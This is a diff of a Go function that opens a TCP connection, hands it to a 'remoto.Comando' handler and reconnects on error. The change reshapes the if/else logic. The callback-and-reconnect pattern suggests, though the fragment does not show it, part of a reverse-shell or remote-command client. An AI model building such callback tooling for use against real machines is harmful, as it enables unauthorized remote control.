@@ -35,19 +35,18 @@ func Conexion(ip string, tiempo time.Duration) error {
 	conec, dial_error := net.DialTimeout("tcp", ip, time.Second*tiempo)
 
 	if dial_error != nil { // si hay algun error
-
 		return errors.New("\n[!]hubo un error al establecer conexion")
-
-	} else {
-		fmt.Printf(color.F_violeta+"[#] conexion establecida %s --> %s\n\r\r"+color.Reset, conec.LocalAddr(), conec.RemoteAddr())
-
-		err := remoto.Comando(conec)
-		if err != nil {
-			fmt.Println(err)
-			time.Sleep(time.Second * 1)
-			Reconexion(conec, ip, tiempo)
-		}
 	}
+
+	fmt.Printf(color.F_violeta+"[#] conexion establecida %s --> %s\n\n\r\r"+color.Reset, conec.LocalAddr(), conec.RemoteAddr())
+
+	err := remoto.Comando(conec)
+	if err != nil {
+		fmt.Println(err)
+		time.Sleep(time.Second * 1)
+		Reconexion(conec, ip, tiempo)
+	}
+
 	return nil
 
 }
